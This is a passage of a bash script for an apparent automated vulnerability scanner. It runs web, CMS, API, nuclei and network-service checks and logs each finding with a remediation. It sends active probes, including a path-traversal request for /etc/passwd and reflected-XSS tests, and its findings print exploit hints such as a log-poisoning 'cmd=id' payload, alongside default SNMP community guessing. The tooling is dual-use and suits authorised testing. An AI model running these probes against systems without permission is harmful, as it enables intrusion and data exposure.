            run_tool_timeout "dirb-${slug}" "${OUTPUT_DIR}/dirb/dirb_${slug}.txt" 180 \
                dirb "$web_url" "$wlist_web" \
                -S -r -w 2>/dev/null || true
        fi
    done

    # gf — pattern-based filtering on collected URLs to find injection-prone endpoints
    if command -v gf &>/dev/null; then
        local url_corpus="${OUTPUT_DIR}/curl/wayback_urls.txt"
        # Merge katana + hakrawler into corpus
        [[ -s "${OUTPUT_DIR}/curl/katana_crawl.txt" ]] && \
            cat "${OUTPUT_DIR}/curl/katana_crawl.txt" >> "$url_corpus" 2>/dev/null || true
        # Deduplicate URL corpus to prevent inflated gf pattern counts
        sort -u "$url_corpus" -o "$url_corpus" 2>/dev/null || true
        if [[ -s "$url_corpus" ]]; then
            log_section "gf pattern scan on URL corpus..."
            mkdir -p "${OUTPUT_DIR}/gf_output"
            # Pre-filter URL corpus: remove static files
            local _gf_corpus="${url_corpus}.filtered"
            grep -vE "\.(jpg|jpeg|png|gif|svg|ico|woff|ttf|eot|css|pdf|zip|tar|gz|mp4|mp3)([?#]|$)" \
                "$url_corpus" 2>/dev/null > "$_gf_corpus" || cp "$url_corpus" "$_gf_corpus" 2>/dev/null || true
            [[ ! -s "$_gf_corpus" ]] && _gf_corpus="$url_corpus"
            for pat in sqli ssrf xss redirect lfi idor; do
                gf "$pat" < "$_gf_corpus" > "${OUTPUT_DIR}/gf_output/gf_${pat}.txt" 2>/dev/null || true
                local cnt; cnt=$(( $(wc -l < "${OUTPUT_DIR}/gf_output/gf_${pat}.txt" 2>/dev/null || echo 0) + 0 ))
                if [[ ${cnt:-0} -gt 0 ]]; then
                    printf "  \\033[1;35m[gf]\\033[0m ${cnt} potential ${pat^^} URLs found\\n"
                    add_vuln "INFO" "gf Pattern — ${cnt} Potential ${pat^^} Endpoints Found" \
                        "gf pattern matching on crawled URLs identified ${cnt} potentially vulnerable endpoints for ${pat^^} testing." \
                        "Manually test each endpoint. Feed to sqlmap / dalfox / other tools." \
                        "$(head -3 "${OUTPUT_DIR}/gf_output/gf_${pat}.txt" 2>/dev/null | tr '\n' ' ')"
                fi
            done
            
            # --- PRIORITY 3: ACTIVE XSS CONFIRMATION ---
            if [[ -s "${OUTPUT_DIR}/gf_output/gf_xss.txt" ]]; then
                log_section "Active XSS Reflection Testing..."
                local xss_payload="acroxss_canary"
                local xss_hits=0
                while IFS= read -r xurl; do
                    [[ -z "$xurl" ]] && continue
                    local test_url="${xurl}=${xss_payload}"
                    local curr_xss; curr_xss=$(curl -s --max-time 5 "$test_url" 2>/dev/null | head -c 4096 | grep -o "$xss_payload" || true)
                    if [[ -n "$curr_xss" ]]; then
                        add_vuln "HIGH" "Reflected XSS Confirmed (${xurl})" \
                            "A parameter exactly reflects unfiltered input. Cross-Site Scripting is confirmed exploitable." \
                            "Implement strict context-aware output HTML encoding." \
                            "${test_url} reflected payload unharmed" \
                            "EXPLOIT: <script>alert(document.domain)</script>" \
                            "PATCH: Escape HTML entities."
                        xss_hits=$(( xss_hits + 1 ))
                        [[ $xss_hits -ge 3 ]] && break
                    fi
                done < <(head -20 "${OUTPUT_DIR}/gf_output/gf_xss.txt")
            fi

            # --- PRIORITY 3: LFI CONFIRMATION (/DownloadFile style params) ---
            if [[ -s "${OUTPUT_DIR}/gf_output/gf_lfi.txt" ]]; then
                log_section "Active Path Traversal Testing..."
                local lfi_hits=0
                while IFS= read -r lurl; do
                    [[ -z "$lurl" ]] && continue
                    # Target parameters named file, download, path, name etc.
                    local lfi_url; lfi_url=$(echo "$lurl" | sed 's/=.*/=..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd/')
                    local lfi_resp; lfi_resp=$(curl -s --max-time 5 "$lfi_url" 2>/dev/null | head -c 2048)
                    if echo "$lfi_resp" | grep -qiE "root:.*:0:0:"; then
                        add_vuln "CRITICAL" "LFI Confirmed — /etc/passwd Read" \
                            "Path traversal parameter exploitation successful. Reading local /etc/passwd contents." \
                            "Validate file paths strictly against an allowlist pattern. Never trust absolute path directives." \
                            "${lfi_url} dumped root user hash format" \
                            "EXPLOIT: ?file=../../../../var/log/auth.log&cmd=id (RCE transition)" \
                            "PATCH: Refactor file fetch mechanic."
                        lfi_hits=$(( lfi_hits + 1 ))
                        [[ $lfi_hits -ge 2 ]] && break
                    fi
                done < <(grep -iE "download|file|name|path=" "${OUTPUT_DIR}/gf_output/gf_lfi.txt" | head -10)
            fi
        fi
    fi

    # 403bypass — test Forbidden responses for access control bypass techniques
    if command -v 403bypass &>/dev/null && [[ ${#WEB_TARGETS[@]} -gt 0 ]]; then
        for web_url in "${WEB_TARGETS[@]:0:2}"; do
            _is_valid_url "$web_url" || continue
            local slug; slug=$(echo "$web_url" | sed 's|[/:.]|_|g')
            run_tool_timeout "403bypass-${slug}" "${OUTPUT_DIR}/bypass403/bypass_${slug}.txt" 60 \
                403bypass -u "$web_url" 2>/dev/null || true
            if grep -qiE "200 OK|bypass" "${OUTPUT_DIR}/bypass403/bypass_${slug}.txt" 2>/dev/null; then
                add_vuln "HIGH" "403 Bypass Successful (${web_url})" \
                    "HTTP 403 Forbidden was bypassed via header/path manipulation techniques. Access control enforcement is incomplete." \
                    "Implement server-side access controls. Do not rely solely on URL-based 403 blocks." \
                    "$(grep -i '200 OK\|bypass' "${OUTPUT_DIR}/bypass403/bypass_${slug}.txt" | head -2)"
            fi
        done
    fi

    log_ok "Phase 11 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 12 — CMS DETECTION & DEEP SCANNING
# ════════════════════════════════════════════════════════════════════════════════
phase_cms() {
    log_phase 12 "${PHASE_NAMES[12]}"
    if [[ "${CMS_TYPE:-None}" == "None" ]]; then
        log_info "Dispatcher: Target state [CMS_TYPE=None]. Bypassing Phase 12 entirely."
        PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
        return 0
    fi

    [[ ${#WEB_TARGETS[@]} -eq 0 ]] && WEB_TARGETS=("http://${TARGET}")
    local primary_url="${WEB_TARGETS[0]}"

    # WordPress
    if [[ "$CMS_TYPE" == "WordPress" ]]; then
        log_info "WordPress detected — running WPScan..."

        if command -v wpscan &>/dev/null; then
            local -a wp_args=(--url "$primary_url" --no-banner --disable-tls-checks)
            [[ "$SCAN_PROFILE" == "deep"     ]] && wp_args+=(--enumerate vp,vt,u --plugins-detection aggressive)
            [[ "$SCAN_PROFILE" == "standard" ]] && wp_args+=(--enumerate vp,u   --plugins-detection passive)
            [[ "$SCAN_PROFILE" == "quick"    ]] && wp_args+=(--enumerate vp)

            local wp_t=300; [[ "$SCAN_PROFILE" == "deep" ]] && wp_t=600
            run_tool_timeout "wpscan" "${OUTPUT_DIR}/wpscan/wpscan.txt" "$wp_t" \
                wpscan "${wp_args[@]}" 2>/dev/null || true

            local wf="${OUTPUT_DIR}/wpscan/wpscan.txt"
            if [[ -f "$wf" ]]; then
                if grep -qi "WordPress.*version.*[0-9]" "$wf"; then
                    local wp_ver; wp_ver=$(grep -oi "WordPress.*[0-9]\+\.[0-9]\+\.[0-9]*" "$wf" | head -1)
                    add_vuln "MEDIUM" "WordPress Version Disclosed (${wp_ver})" \
                        "WordPress version is publicly visible, allowing targeted CVE exploitation." \
                        "Add ?v= version query to assets. Restrict readme.html, license.txt access." \
                        "$wp_ver"
                fi
                grep -qiE "\[!\].*VULNERABILITY|FIXED IN.*[0-9]|CVE-[0-9]" "$wf" && \
                    add_vuln "HIGH" "WordPress Plugin/Theme CVEs Detected" \
                        "WPScan found known CVEs in installed plugins or themes." \
                        "Update all plugins and themes. Remove unused plugins." \
                        "$(grep -iE '\[!\].*VULNERABILITY|CVE-' "$wf" | head -5 | tr '\n' ' ')"
                grep -qiE "Username.*Found|user.*enum" "$wf" && \
                    add_vuln "MEDIUM" "WordPress User Enumeration Possible" \
                        "WordPress leaks usernames via author enumeration (?author=1), REST API, or login errors." \
                        "Disable user enumeration. Hide username. Use generic login error messages." \
                        "$(grep -i 'username\|user found' "$wf" | head -3)"
                grep -qi "xmlrpc.*enabled" "$wf" && \
                    add_vuln "HIGH" "WordPress XML-RPC Enabled" \
                        "xmlrpc.php enables brute-force amplification and DDoS vector." \
                        "Disable XML-RPC via plugin or .htaccess." \
                        "WPScan: xmlrpc.php enabled"
            fi
        fi

        # Check wp-config.php backup
        for backup in "wp-config.php.bak" "wp-config.php~" "wp-config.txt" "wp-config.php.old"; do
            local resp; resp=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
                "${primary_url}/${backup}" 2>/dev/null || echo "000")
            if [[ "$resp" == "200" ]]; then
                add_vuln "CRITICAL" "WordPress wp-config.php Backup Exposed" \
                    "wp-config backup contains database credentials and secret keys in plaintext." \
                    "Remove backup files immediately. Rotate all credentials." \
                    "${primary_url}/${backup} — HTTP 200"
            fi
        done
    fi

    # Drupal
    if [[ "$CMS_TYPE" == "Drupal" ]]; then
        log_info "Drupal detected — checking for Drupalgeddon..."

        # Check Drupalgeddon2 (CVE-2018-7600)
        local drupal_rce_path="${primary_url}/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        local drupal_resp; drupal_resp=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
            "$drupal_rce_path" 2>/dev/null || echo "000")
        [[ "$drupal_resp" == "200" ]] && \
            add_vuln "CRITICAL" "Potential Drupalgeddon2 (CVE-2018-7600)" \
                "Drupalgeddon2 allows unauthenticated Remote Code Execution in Drupal 7.x/8.x." \
                "Apply SA-CORE-2018-002. Update Drupal to latest version." \
                "Path: ${drupal_rce_path} — HTTP ${drupal_resp}"

        # Check Drupalgeddon3 (CVE-2018-7602)
        if command -v droopescan &>/dev/null; then
            run_tool_timeout "droopescan" "${OUTPUT_DIR}/droopescan/droopescan.txt" 120 \
                droopescan scan drupal -u "$primary_url" 2>/dev/null || true
        fi

        # Check CHANGELOG.txt version disclosure
        local cl_resp; cl_resp=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
            "${primary_url}/CHANGELOG.txt" 2>/dev/null || echo "000")
        [[ "$cl_resp" == "200" ]] && \
            add_vuln "MEDIUM" "Drupal CHANGELOG.txt Version Disclosure" \
                "CHANGELOG.txt reveals exact Drupal version, aiding targeted attacks." \
                "Block access to CHANGELOG.txt, README.txt, LICENSE.txt." \
                "${primary_url}/CHANGELOG.txt — HTTP 200"
    fi

    # Joomla
    if [[ "$CMS_TYPE" == "Joomla" ]]; then
        log_info "Joomla detected..."
        if command -v joomscan &>/dev/null; then
            run_tool_timeout "joomscan" "${OUTPUT_DIR}/joomscan/joomscan.txt" 120 \
                joomscan --url "$primary_url" --ec 2>/dev/null || true
        fi
        # Joomla admin exposure
        local j_resp; j_resp=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 \
            "${primary_url}/administrator/index.php" 2>/dev/null || echo "000")
        [[ "$j_resp" == "200" ]] && \
            add_vuln "MEDIUM" "Joomla Admin Panel Exposed" \
                "Joomla administrator login page is accessible without IP restriction." \
                "Restrict /administrator by IP. Rename or move admin directory." \
                "${primary_url}/administrator/index.php — HTTP 200"
    fi

    # Generic CMS — cmseek
    if command -v cmseek &>/dev/null && [[ -z "$CMS_TYPE" ]]; then
        run_tool_timeout "cmseek" "${OUTPUT_DIR}/cmseek/cmseek.txt" 60 \
            cmseek -u "$primary_url" --batch 2>/dev/null || true
    fi

    log_ok "Phase 12 complete. CMS: ${CMS_TYPE:-unknown}"
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 13 — API ENDPOINT DISCOVERY
# ════════════════════════════════════════════════════════════════════════════════
phase_api() {
    log_phase 13 "${PHASE_NAMES[13]}"
    [[ ${#WEB_TARGETS[@]} -eq 0 ]] && WEB_TARGETS=("http://${TARGET}")
    local primary_url="${WEB_TARGETS[0]}"
    local api_dir="${OUTPUT_DIR}/api"
    mkdir -p "$api_dir" 2>/dev/null || true   # BUG FIX: ensure dir exists before first write

    # Common API paths
    local -a api_paths=(
        "api" "api/v1" "api/v2" "api/v3" "rest" "graphql" "swagger" "swagger.json"
        "swagger.yaml" "openapi.json" "openapi.yaml" "api-docs" "docs/api"
        "v1" "v2" "v3" "ws" "jsonapi" "api/swagger.json" "api/openapi.json"
        "api/docs" ".well-known/openapi" "redoc" "api/redoc"
    )

    log_section "Probing API endpoints..."
    local -a found_apis=()
    for path in "${api_paths[@]}"; do
        local resp; resp=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 \
            "${primary_url}/${path}" 2>/dev/null || echo "000")
        if [[ "$resp" =~ ^(200|201|400|401|403)$ ]]; then
            found_apis+=("${primary_url}/${path} [HTTP ${resp}]")
            log_info "API endpoint: ${primary_url}/${path} — HTTP ${resp}"
            printf "%s\n" "${primary_url}/${path}" >> "${api_dir}/discovered_apis.txt"
        fi
    done

    if [[ ${#found_apis[@]} -gt 0 ]]; then
        add_vuln "INFO" "API Endpoints Discovered (${#found_apis[@]} found)" \
            "API endpoints found. Check for authentication, rate limiting, IDOR, and data exposure." \
            "Secure all API endpoints with authentication, rate limiting, and input validation." \
            "$(printf '%s\n' "${found_apis[@]:0:5}")"

        # Check for unauthenticated swagger/openapi
        for f in "swagger.json" "swagger.yaml" "openapi.json" "openapi.yaml"; do
            local swagger_resp; swagger_resp=$(curl -s -o /dev/null -w "%{http_code}" --max-time 8 \
                "${primary_url}/${f}" 2>/dev/null || echo "000")
            if [[ "$swagger_resp" == "200" ]]; then
                add_vuln "HIGH" "API Documentation Publicly Accessible (${f})" \
                    "API documentation exposes all endpoints, parameters, and authentication methods to attackers." \
                    "Require authentication to access API docs. Disable in production." \
                    "${primary_url}/${f} — HTTP 200"
                curl -s -L --max-time 15 "${primary_url}/${f}" \
                    > "${api_dir}/${f}" 2>/dev/null || true
            fi
        done
    fi

    # arjun — parameter discovery
    # BUG FIX: removed duplicate -oT flag (run_tool_timeout already redirects stdout to outfile)
    if command -v arjun &>/dev/null && [[ ${#found_apis[@]} -gt 0 ]]; then
        # Use first discovered API URL (strip the [HTTP xxx] suffix added during discovery)
        local arjun_target; arjun_target=$(printf '%s
' "${found_apis[@]}" | head -1 | awk '{print $1}')
        [[ -z "$arjun_target" ]] && arjun_target="${primary_url}/api"
        run_tool_timeout "arjun" "${api_dir}/arjun_params.txt" 120             arjun -u "$arjun_target" --stable 2>/dev/null || true
    fi

    # GraphQL introspection
    # BUG FIX: tightened grep pattern — bare 'types' matches any JSON body;
    #          check for '__schema' or '"types":[' which are unique to GraphQL introspection responses
    for proto_target in "${WEB_TARGETS[@]:0:3}"; do
        _is_valid_url "$proto_target" || continue
        local gql_resp; gql_resp=$(curl -s --max-time 10 -X POST \
            -H "Content-Type: application/json" \
            -d '{"query":"{__schema{types{name}}}"}' \
            "${proto_target}/graphql" 2>/dev/null || echo "")
        if echo "$gql_resp" | grep -qE '"__schema"|"types":\[|"data":\{'; then
            add_vuln "HIGH" "GraphQL Introspection Enabled" \
                "GraphQL introspection exposes entire schema, including sensitive queries and mutations." \
                "Disable introspection in production. Implement depth limiting and query complexity analysis." \
                "${proto_target}/graphql — introspection enabled"
            echo "$gql_resp" > "${api_dir}/graphql_schema.json"
        fi
    done

    log_ok "Phase 13 complete. API endpoints: ${#found_apis[@]}"
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 14 — NUCLEI FULL VULNERABILITY SCAN
# ════════════════════════════════════════════════════════════════════════════════
phase_nuclei() {
    log_phase 14 "${PHASE_NAMES[14]}"

    if ! command -v nuclei &>/dev/null; then
        log_warn "nuclei not found. Skipping."
        PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
        return 0
    fi

    [[ ${#WEB_TARGETS[@]} -eq 0 ]] && WEB_TARGETS=("http://${TARGET}")

    if [[ "$SCAN_PROFILE" == "deep" ]]; then
        log_info "Updating nuclei templates..."
        nuclei -update-templates -silent 2>/dev/null || true
    fi

    printf '%s\n' "${WEB_TARGETS[@]+${WEB_TARGETS[@]}}" > "${OUTPUT_DIR}/nuclei/targets.txt"

    # ── DISPATCHER: Context-Aware Tag Assembly ──────────────────────────────────
    # NUCLEI_TAGS is pre-computed by web_parser.py from structured JSON.
    # The bash script does not own the tech-to-tag mapping — the data engine does.
    local -a base_tags=("cve" "misconfig")
    [[ "$SCAN_PROFILE" == "deep" ]] && base_tags+=("exposed-panels" "default-login" "takeover" "xss" "sqli" "ssrf" "rce" "lfi")
    [[ "$SCAN_PROFILE" != "deep" ]] && base_tags+=("exposed-panels" "default-login" "takeover")

    # Merge pre-computed application-layer tags with base tags
    local base_str; base_str=$(printf '%s,' "${base_tags[@]}" | sed 's/,$//')
    local merged_tags="$base_str"
    if [[ -n "${NUCLEI_TAGS:-}" ]]; then
        merged_tags="${base_str},${NUCLEI_TAGS}"
    fi

    # Deduplicate
    local tags_str; tags_str=$(echo "$merged_tags" | tr ',' '\n' | sort -u | tr '\n' ',' | sed 's/,$//')
    log_ok "Dispatcher: Nuclei tags assembled from structured state: ${tags_str}"

    local nuclei_severity="medium,high,critical"
    [[ "$SCAN_PROFILE" == "deep" ]] && nuclei_severity="info,low,medium,high,critical"
    [[ "$SCAN_PROFILE" == "quick" ]] && nuclei_severity="high,critical"

    local nuclei_t=300; [[ "$SCAN_PROFILE" == "deep" ]] && nuclei_t=600
    local nuclei_ver=0; { nuclei_ver=$(nuclei -version 2>&1 | grep -oE '[0-9]+' | head -1); nuclei_ver=$(( ${nuclei_ver//[^0-9]/} + 0 )); } 2>/dev/null || true
    local nuclei_sev_flag="-severity"; local nuclei_json_flag="-json-export"
    [[ ${nuclei_ver:-0} -ge 3 ]] && nuclei_sev_flag="-s" && nuclei_json_flag="-je"

    run_tool_timeout "nuclei" "${OUTPUT_DIR}/nuclei/nuclei_results.txt" "$nuclei_t" \
        nuclei -l "${OUTPUT_DIR}/nuclei/targets.txt" \
        "$nuclei_sev_flag" "$nuclei_severity" -tags "$tags_str" \
        "$nuclei_json_flag" "${OUTPUT_DIR}/nuclei/nuclei_results.json" \
        -silent -nc 2>/dev/null || true

    # MANDATE 2: Parse via jq JSON instead of grep on text
    local nj="${OUTPUT_DIR}/nuclei/nuclei_results.json"
    if [[ "$JQ_AVAILABLE" == true ]] && [[ -s "$nj" ]]; then
        log_section "Parsing nuclei JSON results with jq..."
        local crit=0 high=0 med=0
        crit=$(jq -r 'select(.info.severity=="critical") | .info.severity' "$nj" 2>/dev/null | wc -l || echo 0)
        high=$(jq -r 'select(.info.severity=="high") | .info.severity' "$nj" 2>/dev/null | wc -l || echo 0)
        med=$(jq -r 'select(.info.severity=="medium") | .info.severity' "$nj" 2>/dev/null | wc -l || echo 0)
        crit=$(( ${crit//[^0-9]/} + 0 )); high=$(( ${high//[^0-9]/} + 0 )); med=$(( ${med//[^0-9]/} + 0 ))

        [[ $crit -gt 0 ]] && add_vuln "CRITICAL" "Nuclei: ${crit} Critical Vulnerabilities" \
            "Nuclei detected critical severity issues via template-based detection." \
            "Review nuclei_results.json for full details." \
            "$(jq -r 'select(.info.severity=="critical") | "[CRIT] " + .info.name + " -> " + .host' "$nj" 2>/dev/null | head -5 | tr '\n' ' ')"

        [[ $high -gt 0 ]] && add_vuln "HIGH" "Nuclei: ${high} High Severity Issues" \
            "Nuclei detected high severity vulnerabilities." \
            "Review nuclei_results.json." \
            "$(jq -r 'select(.info.severity=="high") | "[HIGH] " + .info.name + " -> " + .host' "$nj" 2>/dev/null | head -5 | tr '\n' ' ')"

        [[ $med -gt 0 ]] && add_vuln "MEDIUM" "Nuclei: ${med} Medium Severity Issues" \
            "Nuclei detected medium severity misconfigurations." \
            "Review nuclei_results.json." \
            "$(jq -r 'select(.info.severity=="medium") | "[MED] " + .info.name + " -> " + .host' "$nj" 2>/dev/null | head -5 | tr '\n' ' ')"

        log_ok "Nuclei jq parse: ${crit} critical, ${high} high, ${med} medium"

        # Structured summary
        jq -r 'select(.info.severity=="critical" or .info.severity=="high") |
            "[" + (.info.severity|ascii_upcase) + "] " + .info.name + " -> " + .host + " (" + .template_id + ")"' \
            "$nj" 2>/dev/null > "${OUTPUT_DIR}/nuclei/nuclei_summary.txt" || true
    else
        # Fallback: grep-based parsing (less accurate)
        local nf="${OUTPUT_DIR}/nuclei/nuclei_results.txt"
        if [[ -f "$nf" ]] && [[ -s "$nf" ]]; then
            local crit; crit=$(grep -c "\[critical\]" "$nf" 2>/dev/null || true); crit=$(( 10#0${crit} ))
            local high; high=$(grep -c "\[high\]" "$nf" 2>/dev/null || true); high=$(( 10#0${high} ))
            local med; med=$(grep -c "\[medium\]" "$nf" 2>/dev/null || true); med=$(( 10#0${med} ))
            [[ $crit -gt 0 ]] && add_vuln "CRITICAL" "Nuclei: ${crit} Critical Vulnerabilities" \
                "Nuclei detected critical issues." "Review nuclei_results.txt." \
                "$(grep '\[critical\]' "$nf" | head -5 | tr '\n' ' ')"
            [[ $high -gt 0 ]] && add_vuln "HIGH" "Nuclei: ${high} High Issues" \
                "High severity vulnerabilities found." "Review nuclei_results.txt." \
                "$(grep '\[high\]' "$nf" | head -5 | tr '\n' ' ')"
            log_ok "Nuclei (text): ${crit} crit, ${high} high, ${med} med"
        fi
    fi

    log_ok "Phase 14 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 15 — NETWORK SERVICE ENUMERATION
# ════════════════════════════════════════════════════════════════════════════════
phase_network_services() {
    log_phase 15 "${PHASE_NAMES[15]}"
    local nmap_dir="${OUTPUT_DIR}/nmap"

    # --- SMB ---
    if echo "$OPEN_PORTS" | grep -qE "(^|,)(139|445)(,|$)"; then
        run_tool_timeout "nmap-smb" "${nmap_dir}/nmap_smb.txt" 90 \
            nmap -sV -p 139,445 \
            --script smb-security-mode,smb2-security-mode,smb-vuln-ms17-010,smb-vuln-ms06-025,smb-vuln-ms07-029,smb-vuln-cve-2017-7494,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-system-info \
            "$TARGET" 2>/dev/null || true

        local sf="${nmap_dir}/nmap_smb.txt"
        if [[ -f "$sf" ]]; then
            grep -qiE "Message signing.*disabled|signing.*not required|message_signing: disabled" "$sf" && \
                add_vuln "HIGH" "SMB Signing Disabled" \
                    "SMB signing disabled allows NTLM relay attacks. Attacker can relay credentials to impersonate users." \
                    "Enable SMB signing: require_security_signatures = yes in smb.conf or via GPO." \
                    "SMB message signing: disabled"

            grep -qiE "Guest.*account.*enabled|GUEST.*OK" "$sf" && \
                add_vuln "HIGH" "SMB Guest Account Enabled" \
                    "SMB Guest access allows unauthenticated enumeration of shares and files." \
                    "Disable guest account. Enforce authentication for all SMB access." \
                    "SMB guest account: enabled"

            grep -qi "samba.*[23]\." "$sf" && \
                add_vuln "CRITICAL" "Samba SambaCry (CVE-2017-7494) Potential" \
                    "Older Samba versions are vulnerable to SambaCry — unauthenticated RCE via writable shares." \
                    "Update Samba. Disable writeable shares. Firewall 139/445." \
                    "$(grep -i 'samba' "$sf" | head -1)"
        fi
    fi

    # --- SNMP deep enum ---
    if echo "$OPEN_PORTS" | grep -qE "(^|,)161(,|$)" && command -v snmpwalk &>/dev/null; then
        for community in public private community manager admin; do
            run_tool_timeout "snmpwalk-${community}" \
                "${OUTPUT_DIR}/snmp/snmpwalk_${community}.txt" 30 \
                snmpwalk -v2c -c "$community" "$TARGET" 2>/dev/null || true
            if [[ -s "${OUTPUT_DIR}/snmp/snmpwalk_${community}.txt" ]]; then
                add_vuln "HIGH" "SNMP Community String '${community}' Accepted" \
                    "Default SNMP community string accepted. Full system MIB readable — hostname, OS, running processes, interfaces, users." \
                    "Change default community strings. Use SNMPv3 with auth+privacy. Firewall UDP 161." \
                    "snmpwalk -c ${community} ${TARGET} — success"
            fi
        done
    fi

    # --- Memcached (11211) ---
    if echo "$OPEN_PORTS" | grep -qE "(^|,)11211(,|$)"; then
        add_vuln "CRITICAL" "Memcached Exposed (Port 11211)" \
            "Unauth Memcached can be read/written and used as DDoS amplification vector (amplification factor 50,000x)." \
            "Bind Memcached to 127.0.0.1. Firewall port 11211." \
            "11211/tcp open memcached"
    fi

    # --- Kubernetes API (6443, 8001, 10250) ---
    for k8s_port in 6443 8001 10250; do
        if echo "$OPEN_PORTS" | grep -qE "(^|,)${k8s_port}(,|$)"; then
            local k8s_resp; k8s_resp=$(curl -sk --max-time 10 \
                "https://${TARGET}:${k8s_port}/api" 2>/dev/null | grep -c "version" 2>/dev/null || true)
            k8s_resp=$(( 10#0${k8s_resp} ))
            [[ ${k8s_resp:-0} -gt 0 ]] && \
                add_vuln "CRITICAL" "Kubernetes API Server Exposed (Port ${k8s_port})" \
                    "Kubernetes API exposed without authentication — full cluster takeover possible." \
                    "Enable RBAC. Require TLS client auth. Firewall Kubernetes API ports." \
                    "https://${TARGET}:${k8s_port}/api — accessible"
        fi
    done

    # --- Docker API (2375, 2376) ---
    for dock_port in 2375 2376; do
        if echo "$OPEN_PORTS" | grep -qE "(^|,)${dock_port}(,|$)"; then
            # 2375 = plain HTTP Docker socket, 2376 = TLS Docker socket
            local dock_proto="http"; [[ "$dock_port" == "2376" ]] && dock_proto="https"
            local docker_resp; docker_resp=$(curl -sk --max-time 10 \
                "${dock_proto}://${TARGET}:${dock_port}/version" 2>/dev/null | grep -c "ApiVersion" 2>/dev/null || true)
            docker_resp=$(( 10#0${docker_resp} ))
            [[ ${docker_resp:-0} -gt 0 ]] && \
                add_vuln "CRITICAL" "Docker API Exposed (Port ${dock_port})" \
                    "Unauthenticated Docker API allows container creation, host escape, and full system compromise." \
                    "Enable TLS auth for Docker API. Bind to Unix socket only." \
                    "http://${TARGET}:${dock_port}/version — accessible"
        fi
    done

    # --- LDAP (389, 636) ---
    if echo "$OPEN_PORTS" | grep -qE "(^|,)(389|636)(,|$)"; then
        run_tool_timeout "nmap-ldap" "${nmap_dir}/nmap_ldap.txt" 30 \
            nmap -p 389,636 --script ldap-rootdse,ldap-search \
            "$TARGET" 2>/dev/null || true
        grep -qiE "namingContexts|ldap_root" "${nmap_dir}/nmap_ldap.txt" 2>/dev/null && \
            add_vuln "HIGH" "LDAP Anonymous Bind Allowed (Port 389)" \
                "LDAP allows anonymous queries. Active Directory structure, users, and groups may be enumerated." \
                "Disable anonymous LDAP bind. Require authentication for all LDAP queries." \
                "LDAP: anonymous rootDSE accessible"
    fi

    # --- NFS Shares ---
    if echo "$OPEN_PORTS" | grep -qE "(^|,)2049(,|$)"; then
        run_tool_timeout "nmap-nfs" "${nmap_dir}/nmap_nfs.txt" 30 \
            nmap -p 2049 --script nfs-showmount,nfs-ls,nfs-statfs \
            "$TARGET" 2>/dev/null || true
        grep -qiE "NFS Export|nfs-ls|nfs-showmount" "${nmap_dir}/nmap_nfs.txt" 2>/dev/null && \
            add_vuln "HIGH" "NFS Shares Exposed (Port 2049)" \
                "NFS shares are mountable remotely and may contain sensitive files." \
                "Restrict NFS exports to specific IPs. Require Kerberos auth. Firewall 2049." \
                "$(grep -i 'nfs' "${nmap_dir}/nmap_nfs.txt" | head -3)"
    fi

    # --- Rsync (873) ---
    if echo "$OPEN_PORTS" | grep -qE "(^|,)873(,|$)"; then
        local rsync_out; rsync_out=$(timeout 10 rsync --list-only rsync://"${TARGET}"/ 2>/dev/null | head -5 || echo "")
        if [[ -n "$rsync_out" ]]; then
            add_vuln "CRITICAL" "Rsync Anonymous Access Allowed (Port 873)" \
                "Rsync allows unauthenticated access — attacker can download/upload files from/to server." \
                "Require authentication for rsync. Restrict hosts allowed. Firewall port 873." \
                "rsync rsync://${TARGET}/ — accessible"
        fi
    fi

    log_ok "Phase 15 complete."
    PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
}

# ════════════════════════════════════════════════════════════════════════════════
#  PHASE 16 — SMB & ACTIVE DIRECTORY ENUMERATION
# ════════════════════════════════════════════════════════════════════════════════
phase_smb_ad() {
    log_phase 16 "${PHASE_NAMES[16]}"

    if ! echo "$OPEN_PORTS" | grep -qE "(^|,)(139|445)(,|$)"; then
        log_info "No SMB ports open. Skipping."
        PHASES_COMPLETED=$(( PHASES_COMPLETED + 1 ))
        return 0
    fi

    # enum4linux
    if command -v enum4linux &>/dev/null; then
        run_tool_timeout "enum4linux" "${OUTPUT_DIR}/enum4linux/enum4linux.txt" 120 \
            enum4linux -a -l -d "$TARGET" 2>/dev/null || true

        local ef="${OUTPUT_DIR}/enum4linux/enum4linux.txt"
        if [[ -f "$ef" ]]; then
            grep -qiE "NULL session|IPC\$ null|allows null sessions" "$ef" && \
                add_vuln "CRITICAL" "SMB Null Session Allowed" \
                    "SMB null sessions allow unauthenticated enumeration of users, groups, shares, and policies." \
                    "Disable null sessions. Set RestrictAnonymous=2 in registry." \
                    "enum4linux: null session confirmed"
            if grep -qi "Domain.*=" "$ef"; then
                local domain; domain=$(grep -i "Domain.*=" "$ef" | head -1)
                log_ok "Domain found: ${domain}"
            fi
            local users; users=$(grep -oE "user:\[[^]]+\]" "$ef" 2>/dev/null | sed 's/user:\[//;s/\]//' | wc -l || echo 0)
            [[ ${users:-0} -gt 0 ]] && \
                add_vuln "HIGH" "SMB User Enumeration (${users} users found)" \
                    "Domain/local user accounts enumerated via SMB — enables targeted brute-force attacks." \
                    "Restrict anonymous enumeration. Enable account lockout policies." \
                    "$(grep -oE 'user:\[[^]]+\]' "$ef" 2>/dev/null | sed 's/user:\[//;s/\]//' | head -10 | tr '\n' ' ')"
        fi
    fi

    # smbmap
    if command -v smbmap &>/dev/null; then
        run_tool_timeout "smbmap" "${OUTPUT_DIR}/smbmap/smbmap.txt" 60 \
